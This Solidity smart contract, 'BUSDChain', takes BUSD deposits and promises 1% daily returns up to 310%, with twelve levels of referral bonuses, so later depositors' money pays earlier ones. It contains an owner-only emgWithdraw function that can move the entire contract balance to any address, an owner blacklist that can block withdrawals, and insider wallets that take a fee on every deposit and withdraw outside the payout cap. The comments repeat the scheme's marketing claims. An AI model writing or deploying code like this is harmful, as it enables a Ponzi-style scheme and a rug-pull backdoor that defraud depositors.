// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Mint `amount` tokens from the caller's account to `to`.
     */
    function mint(address to, uint256 amount) external;

    /**
     * @dev Burn `amount` tokens from the caller's account to `to`.
     */
    function burnFrom(address from, uint256 amount) external;

}

// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/utils/SafeERC20.sol)
/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
    using AddressUpgradeable for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract BUSDChain is Initializable, PausableUpgradeable, OwnableUpgradeable {
    using SafeERC20 for IERC20;
    address busd;
    IERC20 token;
    address powerAddress;
    IERC20 power;
    uint256 launchDate;

    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 turnover;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint256 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
    }

    struct UserPaid {
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
    }

    mapping(address => User) public users;
    mapping(address => UserPaid) public usersPaid;
    mapping(address => uint256) public userID;
    uint256 public tID;
    uint256 public totalTurnover;

    uint256[] public cycles;                        
    uint256[] public ref_bonuses;                     
    uint256[] public rb_referrals;
    uint256[] public rb_turnover;
    address payable[] private dfWallets;

    uint256 public pool_size;                    
    uint256 public pool_last_draw;
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint256 => address) public pool_top;
    uint256 public pool_c_deposit;
    uint256 public pool_c_turnover;
    bool pool_status;
    mapping(address => bool) public pool_exclude;

    mapping(address => bool) public whiteList;
    mapping(address => bool) public blackList;

    uint256 public total_withdraw;
    uint256 public minFirstDeposit;
    uint256 public TIME_STEP;
    mapping(uint256 => uint256) public dailyBalance;

    bool public dEmgWithdraw;
    bool public wLimitStatus;
    bool public burnStatus;

    uint256 private cL;
    uint256 private cJMYD;

    address payable private wL;
    address payable private wJ;
    address payable private wMY;
    address payable private wD;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event NewDepositUpline(address indexed addr,address indexed upline, uint256 amount, uint256 level);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount, uint256 level);
    event LostMatchPayout(address indexed addr, address indexed from, uint256 amount, uint256 level);
    event PoolPayout(address indexed addr, uint256 amount, uint256 level);
    event NewPool(uint256 cycle, uint256 time);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
    event NewDepositMint(address indexed addr, uint256 amount);
    event MatchBonusMint(address indexed addr, address indexed from, uint256 amount, uint256 level);
    event BurnPower(address indexed addr, uint256 amount, uint256 timestamp);

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize() initializer public {
        __Pausable_init();
        __Ownable_init();

        busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        powerAddress = 0x3893f6d76124CF3168EE4e57b5733A5aFEE15860;

        launchDate = 1671195600; //Fri Dec 16 2022 13:00:00 GMT+0000
        tID = 125;                     
        rb_referrals = [3,5,7,9,11,13,15,17,19,21,23,25]; 

        rb_turnover  = [500 ether,
        2000 ether,
        10000 ether,
        25000 ether,
        50000 ether,
        100000 ether,
        200000 ether,
        400000 ether,
        1000000 ether,
        2500000 ether,
        5000000 ether,
        7500000 ether];

        pool_size = 10; 
        pool_last_draw = uint256(block.timestamp);
        pool_c_deposit = 1000 ether;
        pool_c_turnover = 1000 ether;
        pool_status = true;
        minFirstDeposit = 25 ether;
        TIME_STEP = 1 days;
        dEmgWithdraw = false;
        wLimitStatus = true;
        burnStatus = false;
        cL  = 7;
        cJMYD  = 1;



        token = IERC20(busd);
        power = IERC20(powerAddress);




        ref_bonuses.push(30);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(6);
        ref_bonuses.push(6);
        ref_bonuses.push(4);
        ref_bonuses.push(4);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(1);


        cycles.push(10_000 ether);
        cycles.push(30_000 ether);
        cycles.push(70_000 ether);
        cycles.push(100_000 ether);




        //wallets
        wL  = payable(0x08E558D9B2bed6a3423f6549311f94256fc0E470);
        wJ  = payable(0x0C487aAA304412Cd2e8e2ff6a7cb1Ae3C1ACc618);
        wMY = payable(0x2282705C6881882287Cc25143F932fA0F12f7caF);
        wD  = payable(0xAB3043d53fFDf51b9F526675259e9268d9cD9FeB);

        dfWallets =[payable(0x08E558D9B2bed6a3423f6549311f94256fc0E470)];

        // Main Benefits

        // Based on the stable token BUSD - You will no longer be dependent on the volatility of the markets... Produced and owned by Binance.com.

        // Smart Contract Audit by Cetrik.org (they do audits for Polygon, Shiba, PancakeSwap, The Sandbox, 1inch, Axie, BNB Chain, and other massive projects) - Audit Details

        // Earn up to 1% daily until 310% - entirely passive 1% per day

        // Real Total Profit (invest $1000 and return $3100 as an example)

        // Generous 10% Direct Referrals Program - invite and get huge rewards.

        // Matching Bonus Profit Program with 12 Levels - This is golden nuts in your profitable feature.

        // Leadership Bonus - You can be one of the top leaders each day and receive unique rewards
    }

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner(), "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else require(_amount >= minFirstDeposit && _amount <= cycles[0], "Bad amount");
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint256(block.timestamp);
        users[_addr].total_deposits += _amount;

        usersPaid[_addr].direct_bonus = 0;
        usersPaid[_addr].match_bonus = 0;
        usersPaid[_addr].pool_bonus = 0;
        
        emit NewDeposit(_addr, _amount);

        power.mint(_addr, _amount * 5);
        emit NewDepositMint(_addr, _amount * 5);

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount / 10;
            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }

        if(pool_status){
            _pollDeposits(_addr, _amount);

            if(pool_last_draw + TIME_STEP < block.timestamp) {
                _drawPool();
            }
        }

        uint256 feeL = _amount * cL / 100;
        uint256 feeJMYD = _amount * cJMYD / 100;
        token.safeTransfer(wL, feeL);
        token.safeTransfer(wJ, feeJMYD);
        token.safeTransfer(wMY, feeJMYD);
        token.safeTransfer(wD, feeJMYD);

        if(dailyBalance[cDay()] < cBalance()){
            dailyBalance[cDay()] = cBalance();
        }
    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        if(pool_exclude[upline] == true) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        if(pool_users_refs_deposits_sum[pool_cycle][upline] >= pool_c_turnover && users[upline].deposit_amount >= pool_c_deposit){
            for(uint256 i = 0; i < pool_size; i++) {
                if(pool_top[i] == upline) break;

                if(pool_top[i] == address(0)) {
                    pool_top[i] = upline;
                    break;
                }

                if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                    for(uint256 j = i + 1; j < pool_size; j++) {
                        if(pool_top[j] == upline) {
                            for(uint256 k = j; k <= pool_size; k++) {
                                pool_top[k] = pool_top[k + 1];
                            }
                            break;
                        }
                    }

                    for(uint256 j = uint256(pool_size - 1); j > i; j--) {
                        pool_top[j] = pool_top[j - 1];
                    }
                    pool_top[i] = upline;
                    break;
                }
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint256 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if((users[up].referrals >= rb_referrals[i] && users[up].turnover >= rb_turnover[i]) || (whiteList[up] && i < 3)) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                users[up].match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus, i+1);
                power.mint(up, bonus * 5);
                emit MatchBonusMint(up, _addr, bonus * 5, i+1);
            }
            else{
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                emit LostMatchPayout(up, _addr, bonus, i+1);
            }

            up = users[up].upline;
        }
    }

    function _drawPool() private {

        uint256 draw_amount = pool_balance * 3 / 10;

        uint256 total_turnovers = 0;
        for(uint256 j = 0; j < pool_size; j++) {
            if(pool_top[j] == address(0)) break;
            total_turnovers += pool_users_refs_deposits_sum[pool_cycle][pool_top[j]];
        }

        for(uint256 i = 0; i < pool_size; i++) {
            if(pool_top[i] == address(0)) break;

            if(pool_exclude[pool_top[i]] == false){
                uint256 win = draw_amount * pool_users_refs_deposits_sum[pool_cycle][pool_top[i]] / total_turnovers;
                users[pool_top[i]].pool_bonus += win;
                pool_balance -= win;
                emit PoolPayout(pool_top[i], win , i+1);
            }

        }
        
        for(uint256 i = 0; i < pool_size; i++) {
            pool_top[i] = address(0);
        }

        pool_last_draw = uint256(block.timestamp);
        pool_cycle++;
        emit NewPool(pool_cycle, pool_last_draw);
    }

    function register(address _upline) external {
        require(users[msg.sender].upline == address(0),"Your address is registered");

        address _addr = msg.sender;
        if(block.timestamp < launchDate){
            require(_upline != _addr && (whiteList[_upline] || whiteList[_addr]) , "invalid referrer");
        }
        else{
            if( _upline == _addr || ( users[_upline].deposit_time == 0 && !whiteList[_upline] ) ) {
                _upline = dfWallets[0];
            }
        }
        users[_addr].upline = _upline;
        userID[_addr]  = tID;
        tID++;
        users[_upline].referrals++;
        emit Upline(_addr, _upline);
        for(uint256 i = 0; i < ref_bonuses.length; i++) {
            if(_upline == address(0)) break;
            users[_upline].total_structure++;
            _upline = users[_upline].upline;
        }
    }

    function deposit(uint256 _amount) external {
        require(block.timestamp > launchDate, "Not Launched");
        require(users[msg.sender].upline != address(0),"You need to register first");
        address _upline = users[msg.sender].upline;

        if(dailyBalance[cDay()-1] == 0){
            dailyBalance[cDay()-1] = cBalance();
        }

        token.safeTransferFrom(msg.sender, address(this), _amount);
        totalTurnover += _amount;
        
        for(uint256 i = 0; i < ref_bonuses.length; i++) {
            if(_upline == address(0)) break;
            users[_upline].turnover += _amount;
            emit NewDepositUpline(msg.sender,_upline,_amount,i+1);
            _upline = users[_upline].upline;
        }

        _deposit(msg.sender, _amount);
    }

    function withdraw() external whenNotPaused {
        require(block.timestamp > launchDate, "Not Launched");
        require(!blackList[msg.sender], "Not Allowed");

        bool spFlag = false;
        if(msg.sender == wL || msg.sender == wMY){
            spFlag = true;
        }
        for(uint256 i=0; i < dfWallets.length; i++){
            if(msg.sender == dfWallets[i])
                spFlag = true;
        }

        if(spFlag){
            uint256 to_p;
            to_p += users[msg.sender].direct_bonus;
            usersPaid[msg.sender].direct_bonus += users[msg.sender].direct_bonus;
            users[msg.sender].direct_bonus = 0;

            to_p += users[msg.sender].match_bonus;
            usersPaid[msg.sender].match_bonus += users[msg.sender].match_bonus;
            users[msg.sender].match_bonus = 0;

            users[msg.sender].total_payouts += to_p;
            total_withdraw += to_p;

            token.safeTransfer(msg.sender, to_p);
            emit Withdraw(msg.sender, to_p);
        }
        else{
            (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
            
            require(users[msg.sender].payouts < max_payout, "Full payouts");

            // Deposit payout
            if(to_payout > 0) {
                if(users[msg.sender].payouts + to_payout > max_payout) {
                    to_payout = max_payout - users[msg.sender].payouts;
                }

                users[msg.sender].deposit_payouts += to_payout;
                users[msg.sender].payouts += to_payout;

                _refPayout(msg.sender, to_payout);
            }
            
            // Direct payout
            if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
                uint256 direct_bonus = users[msg.sender].direct_bonus;

                if(users[msg.sender].payouts + direct_bonus > max_payout) {
                    direct_bonus = max_payout - users[msg.sender].payouts;
                }

                users[msg.sender].direct_bonus -= direct_bonus;
                usersPaid[msg.sender].direct_bonus += direct_bonus;
                users[msg.sender].payouts += direct_bonus;
                to_payout += direct_bonus;
            }
            
            // Pool payout
            if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
                uint256 pool_bonus = users[msg.sender].pool_bonus;

                if(users[msg.sender].payouts + pool_bonus > max_payout) {
                    pool_bonus = max_payout - users[msg.sender].payouts;
                }

                users[msg.sender].pool_bonus -= pool_bonus;
                usersPaid[msg.sender].pool_bonus += pool_bonus;
                users[msg.sender].payouts += pool_bonus;
                to_payout += pool_bonus;
            }

            // Match payout
            if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
                uint256 match_bonus = users[msg.sender].match_bonus;

                if(users[msg.sender].payouts + match_bonus > max_payout) {
                    match_bonus = max_payout - users[msg.sender].payouts;
                }

                users[msg.sender].match_bonus -= match_bonus;
                usersPaid[msg.sender].match_bonus += match_bonus;
                users[msg.sender].payouts += match_bonus;
                to_payout += match_bonus;
            }

            require(to_payout > 0, "Zero payout");


            // Check Withdraw Limit
            if(dailyBalance[cDay()] == 0){
                dailyBalance[cDay()] = cBalance();
            }
            if(dailyBalance[cDay()-1] == 0){
                dailyBalance[cDay()-1] = cBalance();
            }

            if(wLimitStatus){
                require(to_payout <= cBalance(), "not enough balance");
                require((cBalance() - to_payout) >= (dailyBalance[cDay()-1] * 8 / 10), "daily withdrawal limit reached");
            }


            users[msg.sender].total_payouts += to_payout;
            total_withdraw += to_payout;
            token.safeTransfer(msg.sender, to_payout);
            emit Withdraw(msg.sender, to_payout);
            
            if(users[msg.sender].payouts >= max_payout) {
                emit LimitReached(msg.sender, users[msg.sender].payouts);
            }
        }
    }

    function burnPower(uint256 _amount) external {
        require(burnStatus, "low balance");
        require(_amount <= powerBalance(msg.sender), "low balance");
        power.burnFrom(msg.sender, _amount);
        emit BurnPower(msg.sender, _amount, block.timestamp);
    }
    
    function drawPool() external {
        require(pool_last_draw + TIME_STEP < block.timestamp, "Failed: Current round is not finished yet");
        require(pool_status, "Failed: Pool system is disable");
        _drawPool();
    }
    
    function pause() external onlyOwner {
        _pause();
    }
    
    function unpause() external onlyOwner {
        _unpause();
    }

    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 31 / 10;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / 100) - users[_addr].deposit_payouts;
            
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }

    function userInfo(address _addr) view external returns(address upline, uint256 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (
            users[_addr].upline,
            users[_addr].deposit_time,
            users[_addr].deposit_amount, 
            users[_addr].payouts, 
            users[_addr].direct_bonus, 
            users[_addr].pool_bonus, 
            users[_addr].match_bonus
        );
    }
    
    function userInfoTotals(address _addr) view external returns(uint256 cycle, uint256 referrals, uint256 turnover, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (
            users[_addr].cycle,
            users[_addr].referrals, 
            users[_addr].turnover, 
            users[_addr].total_deposits, 
            users[_addr].total_payouts, 
            users[_addr].total_structure
        );
    }

    function isRegister(address _addr) view external returns(bool) {
        return users[_addr].upline == address(0) ? false : true;
    }

    function userAvailable(address _addr) view public returns(uint256 _available) {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(_addr);
        
        if(users[_addr].payouts >= max_payout){
            return 0;
        }

        // Deposit payout
        if(to_payout > 0) {
            if(users[_addr].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[_addr].payouts;
            }
        }
        
        // Direct payout
        if(users[_addr].payouts < max_payout && users[_addr].direct_bonus > 0) {
            uint256 direct_bonus = users[_addr].direct_bonus;
            if(users[_addr].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[_addr].payouts;
            }
            to_payout += direct_bonus;
        }
        
        // Pool payout
        if(users[_addr].payouts < max_payout && users[_addr].pool_bonus > 0) {
            uint256 pool_bonus = users[_addr].pool_bonus;
            if(users[_addr].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[_addr].payouts;
            }
            to_payout += pool_bonus;
        }

        // Match payout
        if(users[_addr].payouts < max_payout && users[_addr].match_bonus > 0) {
            uint256 match_bonus = users[_addr].match_bonus;
            if(users[_addr].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[_addr].payouts;
            }
            to_payout += match_bonus;
        }

        _available = to_payout;
    }

    function userEarned(address _addr) view external returns(uint256 _deposit_bonus, uint256 _direct_bonus, uint256 _pool_bonus, uint256 _match_bonus) {
        _direct_bonus = users[_addr].direct_bonus + usersPaid[_addr].direct_bonus;
        _pool_bonus = users[_addr].pool_bonus + usersPaid[_addr].pool_bonus;
        _match_bonus = users[_addr].match_bonus + usersPaid[_addr].match_bonus;
        _deposit_bonus = (users[_addr].payouts + userAvailable(_addr)) - (_direct_bonus + _pool_bonus + _match_bonus);
    }

    function siteInfo() view external returns(uint256 _totalTurnover, uint256 _totalUsers,uint256 _total_withdraw) {
        return (
            totalTurnover,
            tID-125,
            total_withdraw        
        );
    }

    function poolInfo() view external returns(bool _pool_status, uint256 _pool_cycle,uint256 _pool_last_draw, uint256 _pool_balance) {
        return (
            pool_status,
            pool_cycle,
            pool_last_draw,
            pool_balance        
        );
    }

    function poolTopInfo() view external returns(address[10] memory addrs, uint256[10] memory deps) {
        for(uint256 i = 0; i < pool_size; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }

    function userLevel(address _addr) view external returns(uint256 level){
        level = 0;
        for(uint256 i = 0; i < ref_bonuses.length; i++) {            
            if((users[_addr].referrals >= rb_referrals[i] && users[_addr].turnover >= rb_turnover[i]) || (whiteList[_addr] && i < 3)) {
                level = i+1;
            }
            else break;
        }
    }

    function setWLimitStatus(bool _status) external onlyOwner(){
        require(wLimitStatus != _status, "same status");
        wLimitStatus = _status;
    }

    function setPoolStatus(bool _status) external onlyOwner(){
        require(pool_status != _status, "same status");
        pool_status = _status;
    }

    function setPoolExclude(address _addr, bool _status) external onlyOwner(){
        require(pool_exclude[_addr] != _status, "same status");
        pool_exclude[_addr] = _status;
    }

    function setWhiteList(address _addr, bool _status) external onlyOwner(){
        require(whiteList[_addr] != _status, "same status");
        whiteList[_addr] = _status;
    }

    function setBlackList(address _addr, bool _status) external onlyOwner(){
        require(blackList[_addr] != _status, "same status");
        blackList[_addr] = _status;
    }

    function setBurnStatus(bool _status) external onlyOwner(){
        require(burnStatus != _status, "wrong status");
        burnStatus = _status;
    }

    
    function powerTransfer(uint256 _amount, address _addr) external onlyOwner(){
        power.transfer(_addr, _amount);
    }
    
    /**
     * @dev It will disable the emergency withdrawal privilege permanently
     */
    function disableEmgWithdraw() external onlyOwner(){
        require(!dEmgWithdraw, "emergency withdraw removed");
        dEmgWithdraw = true;
    }

    /**
     * @dev The 'emgWithdraw' function is prepared for the project's duration
     * before audit confirmations. After the auditor companies confirmed the 
     * project was fully safe and worked correctly. There is no risk that the 
     * contract balance got hacked; we will permanently disable this privilege
     * via the 'disableEmgWithdraw' function.
     */
    function emgWithdraw(uint256 _amount, address _addr) external onlyOwner(){
        require(!dEmgWithdraw, "emergency withdraw removed");
        if(_amount == 0){
            token.safeTransfer(_addr, cBalance());
        }
        else{
            if(_amount < cBalance()){
                token.safeTransfer(_addr, _amount);
            }
            else{
                token.safeTransfer(_addr, cBalance());
            }
        }
    }

    function updatePower(address _addr) external onlyOwner(){
        require(_addr != address(0), "Failed: emergency withdraw removed");
        power = IERC20(_addr);
    }

    function updateLaunchDate(uint256 _date) external onlyOwner(){
        require(_date > launchDate, "Failed: wrong date");
        require(block.timestamp < launchDate, "Failed: wrong date");
        launchDate = _date;
    }

    function cDay() public view returns(uint) {
		return (block.timestamp / TIME_STEP);
	}

    function cBalance() public view returns(uint) {
		return token.balanceOf(address(this));
	}

    function powerBalance(address _addr) public view returns(uint) {
		return power.balanceOf(_addr);
	}

    function random() private view returns(uint){
        return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));
    }

}